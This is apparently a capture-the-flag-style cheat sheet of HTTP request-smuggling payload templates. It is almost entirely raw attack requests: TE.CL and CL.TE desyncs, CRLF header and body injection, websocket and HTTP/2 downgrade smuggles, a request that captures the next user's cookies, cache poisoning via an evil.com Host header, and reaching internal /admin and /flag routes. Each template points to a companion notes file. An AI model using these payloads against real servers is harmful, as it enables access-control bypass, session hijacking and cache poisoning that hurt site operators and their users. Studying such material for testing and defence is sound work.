# Smuggle shapes — the request-level templates

## The full-request smuggle — TE.CL

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The full `GET /admin` lands as a second request — the cleanest smuggle.

## The prefix smuggle — CL.TE

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Just `G` lands — the next request's `POST` becomes `GPOST` — a prefix
poison.

## The suffix smuggle — the trailing fragment

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0

GET / HTTP/1.1
```

The trailing `GET /` completes the smuggle's framing — the connection
has a clean close — `cl-te-desync.md`.

## The header-injection smuggle — the fold

```text
GET /?host=x%0d%0aX-Inj:%201 HTTP/1.1
```

`crlf-injection.md` — the header-fold inside a URL-param.

## The body-fold smuggle — the second request

```text
GET /?host=x%0d%0a%0d%0aGET%20/admin HTTP/1.1
```

`crlf-injection.md` — the body-fold.

## The upgrade-tunnel smuggle — inside a frame

```text
GET /ws Upgrade:websocket → 101 → send HTTP inside a frame
```

`upgrade-smuggling.md`.

## The h2 smuggle — the downgrade headers

```text
:method POST :path / content-length 0 + DATA bytes
```

`http2-smuggling.md`.

## The cookie-steal smuggle — the CL-eats-next

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The next request inside `x=` — `session-hijack.md`.

## The cache-poison smuggle — the cached response

```text
GET /?cb=xyz HTTP/1.1
Host: evil.com
```

smuggled → the response caches under `?cb=xyz` — `cache-poison-via-smuggle.md`.

## The internal-route smuggle — `GET /flag`

```text
GET /flag HTTP/1.1
Host: internal
```

smuggled — the internal route — `internal-routes.md`.

## The queue-poison smuggle — the next-victim

```text
GET /poison HTTP/1.1
```

smuggled — the next victim's response is `/poison`'s — `response-poisoning.md`.
